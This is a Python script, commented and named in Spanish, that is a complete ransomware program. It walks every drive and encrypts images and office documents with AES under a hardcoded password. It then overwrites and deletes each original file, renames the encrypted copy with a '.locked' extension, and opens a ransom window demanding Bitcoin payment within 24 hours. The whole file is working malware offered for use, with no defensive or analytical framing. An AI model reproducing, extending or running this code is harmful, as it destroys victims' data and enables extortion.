import os
import hashlib
import logging
import threading
import zlib
import tkinter as tk
from tkinter import messagebox
from concurrent.futures import ThreadPoolExecutor
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

EXTENSIONES = (".jpg", ".jpeg", ".png", ".gif", ".bmp", ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx")
EXCLUIR_CARPETAS = ["C:\\Windows", "C:\\Program Files", "C:\\Program Files (x86)"]
CONTRASENA_FIJA = "r$a#i!d&e#n#s="
NUMERO_HILOS = os.cpu_count() if os.cpu_count() else 10  #ajusta los hilos según el procesador mi adoking

PRIORIDAD_CARPETAS = ["Documents", "Escritorio", "Desktop", "Pictures", "Imágenes"]

def generar_clave(password):
    return hashlib.sha256(password.encode()).digest()

def eliminar_seguro(ruta):
    try:
        with open(ruta, "ba+") as f:
            longitud = os.path.getsize(ruta)
            f.seek(0)
            f.write(os.urandom(longitud))
        os.remove(ruta)
        logging.info(f"archivo eliminado{ruta}")
    except Exception as e:
        logging.error(f"error al eliminar{ruta} {e}")

def comprimir_datos(datos):
    return zlib.compress(datos, level=9)

def descomprimir_datos(datos):
    return zlib.decompress(datos)

def cifrar_archivo(ruta, clave):
    try:
        with open(ruta, "rb") as f:
            datos = f.read()
        
        datos_comprimidos = comprimir_datos(datos)
        iv = get_random_bytes(16)
        cipher = AES.new(clave, AES.MODE_GCM, iv)
        datos_cifrados, tag = cipher.encrypt_and_digest(datos_comprimidos)
        
        ruta_cifrada = ruta + ".locked"
        with open(ruta_cifrada, "wb") as f:
            f.write(iv + tag + datos_cifrados)
        
        eliminar_seguro(ruta)
        logging.info(f"archivo cifrado: {ruta_cifrada}")
    except Exception as e:
        logging.error(f"error al cifrar {ruta}: {e}")

def descifrar_archivo(ruta, clave):
    try:
        with open(ruta, "rb") as f:
            datos = f.read()
        
        iv = datos[:16]
        tag = datos[16:32]
        datos_cifrados = datos[32:]
        
        cipher = AES.new(clave, AES.MODE_GCM, iv)
        datos_descomprimidos = descomprimir_datos(cipher.decrypt_and_verify(datos_cifrados, tag))
        
        ruta_original = ruta.replace(".locked", "")
        with open(ruta_original, "wb") as f:
            f.write(datos_descomprimidos)
        
        os.remove(ruta)
        logging.info(f"archivo descifrado: {ruta_original}")
    except Exception as e:
        logging.error(f"error al descifrar {ruta}: {e}")

def obtener_todas_las_rutas():
    posibles_rutas = []
    if os.name == "nt":
        from string import ascii_uppercase
        for letra in ascii_uppercase:
            ruta = f"{letra}:/"
            if os.path.exists(ruta):
                posibles_rutas.append(ruta)
    else:
        posibles_rutas.append("/")
    return posibles_rutas

def cifrar_todos():
    rutas = obtener_todas_las_rutas()
    if not rutas:
        logging.error("no se encontraron rutas demas")
        return
    
    clave = generar_clave(CONTRASENA_FIJA)
    with ThreadPoolExecutor(max_workers=NUMERO_HILOS) as executor:
        for carpeta in rutas:
            for raiz, _, archivos in os.walk(os.path.abspath(carpeta)):
                if any(raiz.startswith(excluir) for excluir in EXCLUIR_CARPETAS):
                    continue
                if any(prioridad in raiz for prioridad in PRIORIDAD_CARPETAS):
                    prioridad = True
                else:
                    prioridad = False
                for archivo in archivos:
                    ruta_archivo = os.path.join(raiz, archivo)
                    if archivo.endswith(EXTENSIONES) and not archivo.endswith(".locked"):
                        executor.submit(cifrar_archivo, ruta_archivo, clave)
    ventana_descifrado()

def descifrar_todos():
    clave = generar_clave(CONTRASENA_FIJA)
    rutas = obtener_todas_las_rutas()
    with ThreadPoolExecutor(max_workers=NUMERO_HILOS) as executor:
        for carpeta in rutas:
            for raiz, _, archivos in os.walk(os.path.abspath(carpeta)):
                for archivo in archivos:
                    ruta_archivo = os.path.join(raiz, archivo)
                    if archivo.endswith(".locked"):
                        executor.submit(descifrar_archivo, ruta_archivo, clave)

def ventana_descifrado():
    def intentar_descifrar():
        password = entry.get()
        if password == CONTRASENA_FIJA:
            descifrar_todos()
            messagebox.showinfo("archivos recuperados")
            root.destroy()
        else:
            messagebox.showerror("contraseña incorrecta")

    root = tk.Tk()
    root.title("descifrado de Archivos - Creado por r###ens")
    root.geometry("400x250")
    tk.Label(root, text="ingrese la contraseña para recuperar sus archivos:", font=("Arial", 12)).pack(pady=10)
    entry = tk.Entry(root, show="*", width=30, font=("Arial", 12))
    entry.pack(pady=5)
    tk.Button(root, text="descifrar", command=intentar_descifrar, font=("Arial", 12), bg="green", fg="white").pack(pady=10)
    tk.Label(root, text="creado por r###ens , tienes 24hrs para pagar", font=("Arial", 10, "italic"), fg="gray").pack(pady=5)
    tk.Label(root, text="BTC Wallet: bc1qxkp0s6ssvnljat3qz2etfhr39nys4rwg2jc47a", font=("Arial", 10, "bold"), fg="black").pack(pady=5)
    root.mainloop()

if __name__ == "__main__":
    cifrar_todos()
